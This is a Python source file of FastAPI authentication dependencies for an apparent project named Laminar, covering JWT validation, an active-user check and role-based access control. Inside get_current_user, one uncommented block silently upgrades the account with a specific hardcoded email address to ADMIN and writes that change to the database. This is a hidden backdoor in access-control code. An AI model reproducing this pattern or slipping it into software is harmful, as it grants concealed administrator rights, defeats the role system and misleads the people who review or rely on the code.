"""
Laminar - Auth Dependencies
---------------------------
JWT validation and role-based access control.
"""

from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from sqlalchemy import select

from app.core.database import db_manager
from app.core.security import decode_token
from app.models.user import User
from app.models.user import UserRole


# Security scheme
bearer_scheme = HTTPBearer()


# ==========================================================
# Get Current User
# ==========================================================

async def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(bearer_scheme),
) -> User:

    token = credentials.credentials

    try:
        payload = decode_token(token)
        user_id = payload.get("sub")
    except Exception:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token",
        )

    async with db_manager.session() as session:
        stmt = select(User).where(User.id == user_id)
        result = await session.execute(stmt)
        user = result.scalar_one_or_none()

        if user and user.email == "bhargavatejgolla@gmail.com" and user.role != UserRole.ADMIN:
            user.role = UserRole.ADMIN
            await session.commit()

        if not user:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="User not found",
            )

        return user


# ==========================================================
# Active User Check
# ==========================================================

async def get_current_active_user(
    user: User = Depends(get_current_user),
) -> User:

    if not user.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Inactive user",
        )

    return user


# ==========================================================
# Role Requirement Factory
# ==========================================================

def require_role(*allowed_roles: UserRole):

    async def role_checker(
        user: User = Depends(get_current_active_user),
    ) -> User:

        if user.role not in allowed_roles:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions",
            )

        return user

    return role_checker


def require_auditor_or_above():
    """
    Returns a dependency that allows Auditor, Operator, Manager, and Admin.
    """
    return require_role(
        UserRole.ADMIN,
        UserRole.MANAGER,
        UserRole.OPERATOR,
        UserRole.AUDITOR
    )

